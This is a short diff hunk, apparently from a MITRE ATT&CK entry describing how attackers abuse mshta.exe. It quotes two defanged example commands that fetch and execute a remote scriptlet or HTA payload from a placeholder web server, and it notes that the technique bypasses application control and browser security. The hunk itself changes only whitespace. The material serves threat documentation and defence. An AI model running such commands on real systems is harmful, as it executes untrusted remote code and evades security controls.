@@ -12,7 +12,7 @@ Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (C
 Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>
 
 They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>
-
+ 
 Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
 
 # MITRE
